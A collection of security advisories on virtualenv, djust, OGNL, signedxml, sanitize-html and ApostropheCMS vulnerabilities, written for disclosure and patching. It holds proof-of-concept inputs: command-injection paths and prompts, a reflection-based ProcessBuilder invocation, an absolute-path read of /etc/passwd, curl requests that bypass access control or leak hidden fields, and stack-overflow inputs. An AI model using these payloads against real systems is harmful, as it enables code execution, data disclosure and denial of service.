items.summary:
### Impact

`ViaTemplateActivator.instantiate_template` replaces the placeholders in an activation template one key at a time, each across the whole text. When a value that it already substituted and quoted contains the name of a later placeholder, the later pass rewrites that name inside the quoted literal. The inserted value brings its own quotes, which close the outer literal, and the rest of the path runs as code when a user activates the environment.

`__VIRTUAL_NAME__` holds the environment's directory name, so a destination such as `A__VIRTUAL_NAME__B/x'$(touch PWNED)'y` is enough. In the default `activate` for bash, the `VIRTUAL_ENV` line renders as:

```sh
VIRTUAL_ENV='/tmp/t/A'x'"'"'$(touch PWNED)'"'"'y'B/x'"'"'$(touch PWNED)'"'"'y'
```

Sourcing that script runs `touch PWNED`. The same payload in a path without the placeholder name runs nothing. `activate.fish` runs the command the same way, and the reporter also showed Python code execution through `activate.xsh` and `bin/activate_this.py`. In `activate.csh`, a directory named after a prompt display placeholder, such as `__VIRTUAL_PROMPT_DISPLAY_TCSH__`, breaks the script with `Unmatched '''`.

No change to `quote()` can stop this, because the rewrite happens after `quote()` ran; it defeats `shlex.quote` and `repr()` alike.

An attacker needs to influence the destination path or `--prompt`: a CI job or wrapper tool that builds the path from a branch or project name, or a directory in a cloned repository or unpacked archive.

The bug affects versions 20.26.6 through 21.14.1. Version 20.26.6 first quoted template values (#2768) and introduced the per-key loop.

### Patches

Fixed in 21.14.2. Activation scripts now keep a placeholder name in the environment's path or prompt as plain text, and activating the example above runs nothing. Fix: https://github.com/pypa/virtualenv/commit/602b26623a724827ff171bf11fef4ad186d01f74

### Workarounds

Do not create an environment whose path or `--prompt` contains a placeholder name such as `__VIRTUAL_NAME__`, `__VIRTUAL_ENV__` or `__VIRTUAL_PROMPT__`, and inspect the generated activation script before you source one you did not create.

### Credits

Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.

items.summary:
### Impact

`FishActivator` defines no `quote()`, so it inherits `ViaTemplateActivator.quote`, which returns `shlex.quote(string)`. That function follows POSIX `sh` rules, where a backslash inside single quotes stays a literal character. fish reads `\'` inside single quotes as an escaped quote and `\\` as an escaped backslash. A value with a backslash before a quote therefore ends the literal somewhere other than where `shlex.quote` put the end, and fish expands the command substitution that follows.

The environment path reaches `set -gx VIRTUAL_ENV`, and `--prompt` or `VIRTUALENV_PROMPT` reaches `set -gx VIRTUAL_ENV_PROMPT`. For `--prompt "x\'\$(touch PWNED)'\'"`, the generated `activate.fish` contains:

```fish
set -gx VIRTUAL_ENV_PROMPT 'x\'"'"'$(touch PWNED)'"'"'\'"'"''
```

`source bin/activate.fish` runs `touch PWNED`, and fish prints no error. The same payload as a directory name runs through `VIRTUAL_ENV`. `--prompt .` takes the current directory's name, so running virtualenv inside a directory someone else named is enough. Without the backslash the payload runs nothing, and under bash it runs nothing either.

virtualenv generates `activate.fish` by default. An attacker needs to influence the environment path or prompt: a CI job or wrapper tool that passes a branch, project or job name through, or a directory in a cloned repository or unpacked archive.

The bug affects every release up to 21.14.1 that ships `activate.fish`. The GHSA-p58f-9548-mpm2 fix in 21.7.13 moved the placeholders outside their quotes but kept `shlex.quote`.

### Patches

Fixed in 21.14.2. `activate.fish` now escapes backslashes and single quotes the way fish reads them, so the example above runs nothing and shows the prompt as given. Fix: https://github.com/pypa/virtualenv/commit/3bddeaf8d02c3ee7f576503efb082f8f494cfcab

### Workarounds

Do not create an environment whose path or prompt contains a backslash, and inspect `activate.fish` before you source one you did not create.

### Credits

Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.

### Affected version / file / line
Version: djust v1.1.4 (latest release, published 2026-09-23). File: python/djust/mcp/server.py:354-433 (MCP tool find_handlers_for_template). Confirmed identical on the commit used for triage, a7e4fafd1667b4db0b1465652d4a63cb17117a07.

### Description
```
@mcp.tool()
def find_handlers_for_template(template_path: str) -> str:
    """
    Args:
        template_path: Either a logical template name (e.g.
            'demos/counter.html' — what you'd pass to `render`) OR
            an absolute filesystem path. Both are searched.
    """
    ...
    resolved_path: str | None = None
    if os.path.isabs(template_path) and os.path.isfile(template_path):
        resolved_path = template_path
    else:
        ...  # logical-name resolution via Django's template loader
    ...
    with open(resolved_path, "r", encoding="utf-8", errors="replace") as f:
        source = f.read()
    handler_names_in_template = sorted({m.group(2) for m in dj_event_attr_re.finditer(source)})
```
When template_path is an absolute path to an existing file, it is used directly, with no confinement to the project/template directories — no realpath() + prefix check, no allowlist. open(resolved_path, ...) then reads the file.

This is inconsistent with the sibling tool in the same file (loaddata, ~line 290-303), which explicitly rejects paths outside the project directory for its own path-like parameter:
```
candidate = os.path.realpath(...)
if base_dir and not candidate.startswith(os.path.realpath(str(base_dir))):
    return json.dumps({"error": f"fixture path '{p}' resolves outside the project directory", ...})
```
find_handlers_for_template has no equivalent check for template_path before the open() call.

### Impact
An MCP client with access to this tool (available whenever the Django project is running the MCP server via python manage.py djust_mcp — no separate opt-in flag gates this specific tool beyond that) can read the contents of any file on disk that the process has read permission to and that exists, by passing an absolute path — e.g. /etc/passwd, application .env files, SSH keys, or any other sensitive file reachable by the server process's user.

Mitigating factor (reduces this from High to Medium): the tool does not return the raw file content. It runs one fixed regex (dj-(?:click|submit|change|input|keydown|keyup)\s*=\s*['"]([^'"]+)['"]) against the content and returns only the matched handler-name strings, plus confirmation that the file exists and is readable (an existence/readability oracle on its own, independent of the regex match). If the targeted file happens to contain text matching that HTML-attribute-like pattern (plausible for config files, logs, or any text file with key="value"-shaped content), those substrings are returned in full — so the read is not purely blind, but it is not a general-purpose arbitrary-file-read primitive either.

Proof of Concept / Reproduction
Traced via direct source read; no live Django project was exercised for this report (would require a full djust project scaffold, which was out of scope for this pass — see limitation below).

1. MCP client calls: find_handlers_for_template(template_path="/etc/passwd")
2. server.py ~line 393:
    ```
       if os.path.isabs(template_path) and os.path.isfile(template_path):
           resolved_path = template_path
    ```
   resolved_path == "/etc/passwd", unchanged, unconfined
3. server.py ~line 430:
    ```
       with open(resolved_path, "r", encoding="utf-8", errors="replace") as f:
           source = f.read()
   ```
   /etc/passwd is now fully read into `source`
4. The regex dj_event_attr_re.finditer(source) is applied to the real
   /etc/passwd content. /etc/passwd will not match this specific pattern, so
   the response would report an empty handler list plus "file exists and was
   read" - which already confirms the path-confinement bypass (compare with
   passing a nonexistent absolute path, which correctly returns
   "Template file not found").
5. On a target where the absolute path points to a file that DOES contain
   text shaped like `dj-click="..."` (e.g. a copied HTML fragment, a stray
   config value, or a crafted file placed by the attacker via another
   vector), the matched substrings are returned verbatim in the JSON
   response - full-content disclosure of just those substrings, not the
   whole file.

### Suggested Fix
Apply the same confinement loaddata already uses, before the os.path.isfile check:
```
if os.path.isabs(template_path):
    candidate = os.path.realpath(template_path)
    if base_dir and not candidate.startswith(os.path.realpath(str(base_dir))):
        return json.dumps({
            "error": f"template path '{template_path}' resolves outside the project directory",
            "resolved": candidate,
            "project_dir": str(base_dir),
        })
    if os.path.isfile(candidate):
        resolved_path = candidate
```
### Limitations
Not exercised against a live Django/djust project — this is a source-level trace of the exact executed branch (os.path.isabs + os.path.isfile + open()), not an end-to-end runtime capture.
Did not verify whether any MCP-host-level confirmation/approval step (some MCP clients prompt the user before a tool call with a suspicious-looking path argument) would intercept this in practice - the vulnerability is in the server's own missing server-side guard regardless of client-side UX.

### Disclosure Timeline
2026-09-24: found during  audit, confirmed via source trace to the open() sink; classified Medium due to the response-content limitation (matched substrings only, not raw file content).
Please check the log file, and apply CVE once the fix is made.

```
log:
10  14:53:20.185935 openat(AT_FDCWD, "/case/project/templates/nonexistent_inside_project.html", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
10  14:53:20.187205 write(1, "{\"error\": \"Could not resolve tem"..., 204) = 204
   ...
10  14:53:20.191831 write(1, "=== ATTACK: absolute path OUTSID"..., 57) = 57
10  14:53:20.194864 write(1, "target path:", 12) = 12
10  14:53:20.198521 write(1, "/case/outside/evil_content.html", 31) = 31
10  14:53:20.202290 newfstatat(AT_FDCWD, "/case/outside/evil_content.html", {st_mode=S_IFREG|0777, st_size=185, ...}, 0) = 0
10  14:53:20.203762 write(1, "exists on disk (from the contain"..., 42) = 42
10  14:53:20.207224 write(1, "True", 4) = 4
10  14:53:20.210392 newfstatat(AT_FDCWD, "/case/outside/evil_content.html", {st_mode=S_IFREG|0777, st_size=185, ...}, 0) = 0

10  14:53:20.213284 openat(AT_FDCWD, "/case/outside/evil_content.html", O_RDONLY|O_CLOEXEC) = 3
10  14:53:20.215202 newfstatat(3, "", {st_mode=S_IFREG|0777, st_size=185, ...}, AT_EMPTY_PATH) = 0
10  14:53:20.216994 ioctl(3, TCGETS, 0x7ffd68e26aa0) = -1 ENOTTY (Inappropriate ioctl for device)
10  14:53:20.221797 read(3, "<html><body>\n<!-- This file live"..., 186) = 185
10  14:53:20.223610 read(3, "", 1) = 0
10  14:53:20.224913 close(3) = 0
```
## Maintainer assessment
The djust MCP server (`manage.py djust_mcp`, `python -m djust.mcp`) only serves stdio to the MCP client that launched it, as the same OS user, on the developer's machine; there is no network listener. The realistic caller is a local AI agent acting on untrusted input. The tool returns only `dj-*`-attribute-shaped substrings and an existence answer, not file contents. We therefore rate this Low (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N, 3.3).

Affected: every release with the tool, 0.9.0 – 1.0.9, 1.1.0 – 1.1.6, 1.2.0 – 1.2.3, 1.3.0rc4 – 1.3.0rc7.

## Patches
Fixed in 1.0.10, 1.1.7, 1.2.4 and 1.3.0rc8. `find_handlers_for_template` reads an absolute path only when it resolves (symlinks and `..` followed) inside a directory the template loaders serve or inside `BASE_DIR`, and answers any other absolute path like a missing template. The `seed_fixtures` guard compared paths with a string prefix (so `/app-data` passed for a `BASE_DIR` of `/app`) and skipped the check when `BASE_DIR` was unset; it now compares whole path components and refuses without `BASE_DIR`. Both use one containment helper.

## Workarounds
Run the MCP server only in projects whose agent you trust with file access, or pass logical template names only.

items.summary:
### Summary

OGNL's optional *stricter invocation* mode maintains a block list that prevents expressions from directly calling methods on dangerous classes such as `Runtime`, `ProcessBuilder`, and `ClassLoader`. The block list filters on the **declaring class of the method OGNL invokes**. Because `java.lang.reflect.Method` (and `Constructor`/`Field`) are not on the list, an expression can use reflection as a proxy — `someMethod.invoke(target, args)` — to reach a blocked method. The real call (e.g. `ProcessBuilder.start()`) then executes inside the JDK reflection machinery and never passes back through OGNL's `invokeMethod`, so the block list never sees it.

### Proof of concept

Under the default OGNL context (public-only access, stricter invocation enabled), the following expression creates a file even though a direct `new ProcessBuilder(...).start()` is blocked:

```
(#pb=new java.lang.ProcessBuilder({"/usr/bin/touch","rce-proof.txt"}),
 #methods=@java.lang.ProcessBuilder@class.getMethods(),
 #names=#methods.{ #this.getName() },
 #startIdx=#names.indexOf("start"),
 #methods[#startIdx].invoke(#pb, null))
```

### Impact and scope — please read carefully

**This is hardening of a defense-in-depth secondary layer, not a break of OGNL's primary security boundary.**

In OGNL the stricter-invocation block list is a *secondary* mitigation. The **primary** access-control gate is the `MemberAccess` implementation supplied by the integrating framework or application, which OGNL consults on every constructor and method call. Frameworks that evaluate untrusted expressions are expected to install a restrictive `MemberAccess` — for example, Apache Struts' `SecurityMemberAccess`, which excludes dangerous classes and the `java.lang.reflect` package. Against such a `MemberAccess` this PoC is blocked at the very first step (the `new ProcessBuilder(...)` constructor), before reflection is ever reachable.

The default context that ships with OGNL intentionally allows all public members and is **not** designed to sandbox untrusted input. An application that evaluates attacker-controlled expressions with that permissive default already has many paths to code execution, and this technique is not required to achieve it.

**You are affected only if all of the following hold:** (1) your application evaluates untrusted/attacker-controlled OGNL expressions, (2) it uses OGNL's default permissive `MemberAccess` (or an equivalently permissive one that allows `java.lang.reflect`), and (3) it relies on the stricter-invocation block list as its sandbox. **Properly configured consumers — including Apache Struts with its `SecurityMemberAccess` — are not affected.** The actual protection for untrusted-expression scenarios remains a correctly configured `MemberAccess`; the block list should not be treated as a sandbox.

### Fix

`java.lang.reflect.Method`, `java.lang.reflect.Constructor`, and `java.lang.reflect.Field` are added to the stricter-invocation block list, so reflection objects can no longer be used as invocation proxies in stricter mode. The `java.lang.invoke.MethodHandle` path was verified not to be exploitable (its signature-polymorphic `invoke`/`invokeExact` fail through OGNL's reflection-based invocation), so no additional classes are required.

### Credit

Reported responsibly through Tidelift by 毛锐 (youyi.mr@alibaba-inc.com).
items.title: OGNL stricter-invocation block list bypass via java.lang.reflect reflection proxies

items.summary:
Exclusive XML canonicalization (`http://www.w3.org/2001/10/xml-exc-c14n#`) in `github.com/moov-io/signedxml` copied the entire accumulated namespace map at every node during `ValidateReferences()`, before any reference digest or signature check.

For a chain of nested elements that each declare many unused namespace prefixes, that produced **O(m × depth²)** time and peak memory (`m` = prefixes per level). `beevik/etree` caps tree depth (~1024), but `m` is unbounded, so a small attacker-controlled document (on the order of 1 MB) could drive multi-gigabyte allocations and OOM the process. No valid signature, matching certificate, or authentication is required.

This is the library’s core path for SAML / WS-Federation service providers, which canonicalize attacker-supplied XML prior to authentication.

### Affected

- Package: `github.com/moov-io/signedxml`
- Function: `ExclusiveCanonicalization` (`exclusivecanonicalization.go`)
- Verified: **v1.4.0** and current default branch (commit `d79064a`). Earlier v1.2.x–v1.3.x releases are likely affected.
 

### Remediation

Do not copy the whole namespace map per node. Maintain a single scope and push/pop only the prefixes introduced at each element. Replace linear prefix-in-scope scans with set lookups. Impose a defensive cap on in-scope namespace declarations and return an error rather than allocating unbounded memory.

From @shuji-oh 
```
Thanks for the fix — I re-ran my PoC against this branch and confirmed the memory blowup is gone.

Before (main)

-- Doubling depth each time (m=10 fixed): allocated grows ~4x each time ≈ O(depth^2) --
depth=250  m=10  payload=  0.07MB allocated=     45MB
depth=500  m=10  payload=  0.14MB allocated=    179MB
depth=1000 m=10  payload=  0.27MB allocated=    711MB
-- Increasing m (depth=1000 fixed): allocated scales roughly linearly with m --
depth=1000 m=5   payload=  0.16MB allocated=    377MB
depth=1000 m=100 payload=  2.57MB allocated=   6278MB
After (fix/exc-c14n-namespace-dos)

-- Doubling depth each time (m=10 fixed): allocated grows ~4x each time ≈ O(depth^2) --
depth=250  m=10  payload=  0.07MB allocated=      2MB
depth=500  m=10  payload=  0.14MB allocated=      4MB
depth=1000 m=10  payload=  0.27MB allocated=      7MB
-- Increasing m (depth=1000 fixed): allocated scales roughly linearly with m --
depth=1000 m=5   payload=  0.16MB allocated=      4MB
depth=1000 m=100 payload=  2.57MB allocated=     47MB
That's roughly a 100–130x reduction in peak allocation for the same payload sizes, and no OOM in any of my runs. This looks like it resolves the issue — thanks for the quick fix!
```

### Credit

Reported by Shuji Ohira ([@shuji-oh](https://github.com/shuji-oh)).

### Summary

Since 2.18.0, when an `<iframe>` is not allowed and `disallowedTagsMode` is `'discard'` (the defaults),
its raw-text content is re-sanitized by a recursive call to `sanitizeHtml(text, options)` (the change
from #5564, fixing #5550). The recursion has no bound and starts each nested call with a fresh state.
Two consequences, both absent from 2.17.7 and 2.17.4:

1. A few kilobytes of unclosed `<iframe>` tags throw `RangeError: Maximum call stack size exceeded`
   with the default options. Any application that sanitizes untrusted HTML with 2.18.0 can be made to
   throw on a small crafted input.
2. `nestingLimit` is not enforced across a discarded iframe: each nested iframe restarts the depth
   count at zero, so the output can be nested arbitrarily deep regardless of the configured limit.

### Affected versions

- 2.18.0 (the current `latest`), and the `main` branch at the time of writing (the recursive call is
  still in `packages/sanitize-html/index.js`, in the `ontext` handler, branch
  `tag === 'iframe' && !tagAllowed(tag) && options.disallowedTagsMode === 'discard'`).
- Not affected: 2.17.7 and 2.17.4 (tested with the same inputs below).

Tested with Node.js v26.7.0.

### Reproduction 1: stack overflow with the default options

```js
const sanitizeHtml = require('sanitize-html');

// with 2.18.0:
sanitizeHtml('<iframe>'.repeat(1000));  // 8,000 chars: returns ''
sanitizeHtml('<iframe>'.repeat(2000));  // 16,000 chars: throws RangeError: Maximum call stack size exceeded
sanitizeHtml('<iframe>'.repeat(20000)); // 160,000 chars: throws RangeError: Maximum call stack size exceeded
```

Results:

| input | 2.17.4 | 2.17.7 | 2.18.0 |
|---|---|---|---|
| `'<iframe>'.repeat(1000)` | ok | ok | ok |
| `'<iframe>'.repeat(2000)` | ok | ok | RangeError |
| `'<iframe>'.repeat(20000)` | ok | ok | RangeError |

The threshold depends on the remaining stack, so it is lower when `sanitizeHtml` is called from an
already deep call stack (for example inside a server-side rendering pass).

### Reproduction 2: `nestingLimit` is bypassed

```js
const sanitizeHtml = require('sanitize-html');

const input = ('<iframe>' + '<b>'.repeat(3)).repeat(50) + 'x';
const out = sanitizeHtml(input, { allowedTags: ['b'], nestingLimit: 3 });
// maximum nesting depth of <b> in `out`:
//   2.17.4: 2    2.17.7: 0 (fallback escaped as text)    2.18.0: 150
```

Without an iframe, the same options cap the output at three nested `<b>` in all three versions. With
`k` repetitions of `'<iframe>' + '<b>'.repeat(3)`, 2.18.0 returns `3 * k` nested `<b>` (measured for
k = 1, 5, 50: depth 3, 15, 150).

### Cause

In 2.18.0 the `ontext` handler does:

```js
} else if (
  tag === 'iframe' &&
  !tagAllowed(tag) &&
  options.disallowedTagsMode === 'discard'
) {
  result += sanitizeHtml(text, options);
}
```

Because htmlparser2 treats `<iframe>` as a raw-text element, the text of an unclosed iframe is the whole
remainder of the input; re-parsing it can meet another unclosed `<iframe>`, and so on, one stack frame
(and one full re-parse) per iframe. The nested call also starts with its own `depth`, so tags inside the
fallback are not counted against `nestingLimit` together with the enclosing tags.

### Possible directions

Not a patch, only what would close both effects: bound the recursion (or process the fallback without
recursing), and carry the current depth into the nested sanitization so that `nestingLimit` applies to
the whole output.
items.title: ApostropheCMS sanitize-html: unbounded recursion when re-sanitizing the fallback of a discarded iframe (stack overflow, nestingLimit not enforced)

## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. 

## Import API bypasses publication roles for protected content

The import gate in canImportOrExport() checks the type's import configuration and view permission. The write helpers then call document-manager insert/update directly, including operations on published variants. We did not find the normal publish permission check or beforePublish transition in these helpers. Core permissions intentionally distinguish editRole and publishRole, and the ordinary publication lifecycle enforces that distinction.

The reported security boundary is a content type that an editor may edit but whose publication is reserved for a stronger role. Direct public-state changes through import must enforce the same publication authority. The original report describes unauthorized creation, replacement, or removal of published content under that configuration.

Suggested remediation: centralize authorization for import writes; require publish permission for every non-autopublished published variant, authorize each concrete target, and preflight the complete import before persistent changes. Preserve authorized draft imports and the intended behavior of autopublished types.

Source references:
- [Import write helpers](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)
- [Import permission gate](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/index.js)
- [Core role distinctions](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/permission/index.js)
- [Core insert/update/publication permission hooks](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/doc/index.js)

Vivek R / Winfunc

items.summary:
### Summary
The `getOne` REST endpoint for pages does not apply `viewRole` type-level restrictions
or `viewPermission` field-level redaction. An editor-level user who knows a document
`_id` can read the full content of admin-only pages and their privileged fields, while
the `getAll` endpoint correctly enforces both restrictions.

### Details
**Finding 3 — viewRole bypass:**
`modules/@apostrophecms/page/index.js` exposes `getRestQuery(req, omitPermissionCheck =
false)`. The `getAll` path calls `publicApiCheckAsync` and threads the full query builder
pipeline including `viewRole` filtering. The `getOne` path uses a divergent code path
that skips this pipeline.

A page type declared with `viewRole: 'admin'` is inaccessible via `GET
/api/v1/@apostrophecms/page?type=secretPage` (returns 403 to an editor) but is fully
returned by `GET /api/v1/@apostrophecms/page/:id:en:published` to the same editor.

**Finding 4 — viewPermission field leak:**
Fields decorated with `viewPermission: { action: 'edit', type: '@apostrophecms/page' }`
are stripped by `removeForbiddenFields` in the `getAll` path but are returned verbatim
in `getOne`. An editor who knows any document `_id` can read all
`viewPermission`-restricted fields.

### PoC
```bash
# Log in as editor, get session jar
EDITOR_JAR="..."

# getAll — correctly blocked
curl -b "$EDITOR_JAR" \
  "http://TARGET/api/v1/@apostrophecms/page?type=secretPage"
# → 403 Forbidden

# getOne — bypassed, returns full document including viewPermission fields
curl -b "$EDITOR_JAR" \
  "http://TARGET/api/v1/@apostrophecms/page/ADMIN_PAGE_ID:en:published"
# → 200 OK, full doc including secretField value
```

### Impact
Editors can read the full content of any page — including those restricted to admins via
`viewRole` — if they know or can guess the `_id`. Sensitive field values gated by
`viewPermission` are also fully exposed. This breaks the content access control model
for any site using these decorators.
items.title: ApostropheCMS: GET /api/v1/@apostrophecms/page/:id bypasses viewRole restriction and exposes viewPermission-gated fields to lower-privileged users

## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.

## Archive duplicate continuation permits unauthorized published-content replacement

The overrideDuplicates() continuation still accepts client-supplied replacement choices, rather than binding them to a server-maintained, user-owned duplicate analysis. The replacement and write helpers do not establish a single canonical resource identity and authorization context before the update. This leaves the reported gap between draft editing authority and the published target selected for replacement unresolved at source level.

The original report describes a contributor crossing the publication boundary through duplicate replacement on an import-enabled localized type. We have not repeated that end-to-end sequence on 3.7.0.

Suggested remediation: bind continuation state to the initiating user, archive, job, permitted source/target mapping, locale and mode; reject inconsistent identity metadata; derive permissions from the actual loaded target and require publication authority for published targets.

Source: overrideDuplicates(), replaceDocId(), and insertOrUpdateDoc() in the [importer](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js).

## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.

## Import archive extraction lacks resource quotas and failure cleanup

The current gzip extractor handles destination write errors and waits for write completion; those parts of the original report should no longer be treated as unchanged. The import routes also now require a logged-in user before big-upload processing, as covered by GHSA-86wm-68pq-5jwq.

However, extract() still writes expanded archive entries without per-entry, aggregate decompressed-byte, or entry-count quotas. Archive parsing still precedes document-type authorization. If extraction or parsing fails, import() notifies and rethrows before the later storage.remove() call, with no unconditional cleanup around that lifecycle. The reported residual risk is excessive storage consumption and retained extraction/staging artifacts from authenticated imports. Handling a write error and requiring login do not enforce a storage budget.

Suggested remediation: add configurable streaming quotas based on actual decompressed bytes, cap entries and allowed entry types, bound concurrent imports, and clean local and uploadfs artifacts on every failure. Retain continuation artifacts only under explicit ownership, expiry and total-storage limits.

items.summary:
### Summary
ApostropheCMS lets a module expose an anonymous read API by setting `publicApiProjection`, which whitelists the document fields unauthenticated callers may see. The public REST GET handler applies every launderable query builder from the query string *before* forcing that projection. Two of those builders, `search` and `sort`, operate on the underlying documents rather than the projected output, and neither is checked against the projection. An unauthenticated attacker can therefore:

- use `?search=<word>` as a **value oracle** to confirm and locate documents by the content of a field the projection was meant to hide, and
- use `?sort[hiddenField]=1` as an **ordering oracle** to rank documents by a hidden field's value.

This is the same confidentiality-bypass class already patched for the `choices`/`counts` builders (gated by `choicesFieldAllowedByProjection`). That gate was never applied to `search` or `sort`.

### Details
For an anonymous caller, `getRestQuery` (piece types: `modules/@apostrophecms/piece-type/index.js:1142`; pages: `modules/@apostrophecms/page/index.js`) does:

```js
const query = self.find(req).attachments(true);
query.applyBuildersSafely(req.query);            // (1) apply ALL launderable builders from the query string
...
query.project({ ...self.options.publicApiProjection, cacheInvalidatedAt: 1 }); // (2) force read projection
query.set('publicApiProjection', self.options.publicApiProjection);            // (3) used only by the choices/counts gate
```

`applyBuildersSafely` (`modules/@apostrophecms/doc-type/index.js:3327`) runs any builder that has a `launder` method. `search` and `sort` both have one (`doc-type/index.js:2288` and `2127`), so `?search=` and `?sort[...]=` are honored for anonymous requests.

**Search vector.** The `search` builder adds `{ $text: { $search: <user input> } }` (`doc-type/index.js:2282`). The `$text` index covers `highSearchText` / `lowSearchText` / `title` / `searchBoost` (`modules/@apostrophecms/doc/index.js:612`). `highSearchText` / `lowSearchText` are built at save time by `@apostrophecms/search:getSearchTexts` → `apos.schema.indexFields(schema, doc, texts)` (`modules/@apostrophecms/search/index.js:377`), which indexes every schema field where `searchable !== false` (the default for string/text fields). `publicApiProjection` does not imply `searchable: false`. Step (2) narrows the output but not the `$text` filter, so the response returns the projected `{title, slug, _id}` of exactly the documents whose hidden field contains the searched word.

**Sort vector.** `finalizeSort` (`doc-type/index.js:3526`) forwards raw user sort keys to MongoDB (it only rewrites fields flagged `sortify: true`). `?sort[hiddenField]=1` orders results by a projection-excluded field. Combined with `perPage`/`page`, an attacker can page through the fully ordered set.

Neither builder consults `publicApiProjection`, whereas `choices`/`counts` are gated at `doc-type/index.js:2807` via `choicesFieldAllowedByProjection`.

### PoC
**Preconditions:** the piece/page type sets `publicApiProjection`, and its schema has at least one searchable (default) or sortable field not included in the projection.

Test type: `article` exposes only `title`, `slug`, `_id`, but has hidden `secret` (integer) and `secretNote` (searchable string):

```js
export default {
  extend: '@apostrophecms/piece-type',
  options: { publicApiProjection: { title: 1, slug: 1, _id: 1 } },
  fields: { add: {
    secret:     { type: 'integer' },
    secretNote: { type: 'string' }   // searchable by default; NOT in the projection
  } }
};
```

Five articles were inserted and published via the authenticated REST API:
`A.secret=50, secretNote="zzsecretalpha"`; `B=10/zzsecretbravo`; `C=90/zzsecretcharlie`; `D=30/zzsecretdelta`; `E=70/zzsecretecho`.
The insert responses confirm the hidden `secretNote` value is written into the search index, e.g. for A: `"highSearchText": "... zzsecretalpha"`, `"lowSearchText": "... zzsecretalpha"`.

Anonymous requests (no credentials, no session):

```bash
# [1] Baseline: projection hides secret/secretNote on direct read
curl -s 'http://localhost:3000/api/v1/article?perPage=1'

# [2] Search oracle: value exists ONLY in hidden secretNote
curl -s 'http://localhost:3000/api/v1/article?search=zzsecretalpha'
curl -s 'http://localhost:3000/api/v1/article?search=zznotpresentxyz'

# [3] Sort oracle: order by hidden integer field
curl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=1'
curl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=-1'

# Negative control: projection override is blocked
curl -s 'http://localhost:3000/api/v1/article?project%5BsecretNote%5D=1&perPage=1'
```

Results (verified on ApostropheCMS 4.32.2, MongoDB 7.0):

| Request (anonymous)       | Observed                                          | Verdict                               |
| ------------------------- | ------------------------------------------------- | ------------------------------------- |
| `GET /api/v1/article`     | `_id,title,slug,type,metaType,cacheInvalidatedAt` | projection works on direct read       |
| `?search=zzsecretalpha`   | only Article A (with textScore)                   | **leak**: locates doc by hidden field |
| `?search=zznotpresentxyz` | 0 results                                         | oracle confirmed                      |
| `?sort[secret]=1`         | B, D, A, E, C  (= 10,30,50,70,90)                 | **leak**: full hidden ordering        |
| `?sort[secret]=-1`        | C, E, A, D, B                                     | reverse confirmed                     |
| `?project[secretNote]=1`  | secretNote absent                                 | gated (projection override blocked)   |

### Impact
Unauthenticated, network-reachable partial disclosure of fields the developer explicitly restricted with `publicApiProjection`:

- **Search oracle:** confirm and locate documents by words in hidden fields (e.g. internal notes, contact emails, draft metadata, moderation/status flags), returning the `title`/`slug`/`_id` of matches.
- **Sort oracle:** full ordering of documents by a hidden field. With one known reference value or a paging binary search, exact hidden values can be recovered.

No authentication or user interaction required. Not a full field dump, but a targeted oracle over exactly the data the projection is meant to conceal. Affects sites that configure `publicApiProjection` on piece types or pages, up to and including 4.32.2 (same code path present on current `main`).

### Remediation
Gate `search`, `sort` (and `autocomplete`, which feeds `search`) on the public API path the same way `choices`/`counts` are gated. When `publicApiProjection` is in force:

- **sort:** reject or drop any sort key not permitted by the projection, reusing `choicesFieldAllowedByProjection`.
- **search:** restrict full-text search to fields the projection exposes (e.g. a projection-scoped search text), or refuse the `search` builder when the projection excludes any searchable field.

### Summary
The `slugTaken` endpoint returns a boolean indicating whether a slug is in use across
all document types and visibility levels, with no permission or type filter. Any logged-in
user (including editors) can enumerate the slug space of private pages, drafts, and
archived content.

### Details
`POST /api/v1/@apostrophecms/doc/slugTaken` with body `{ "slug": "target-slug" }` runs
a raw existence check against the documents collection. It does not:
- Check whether the requesting user has read permission for documents of that type.
- Filter by `visibility` (public, loginRequired, private).
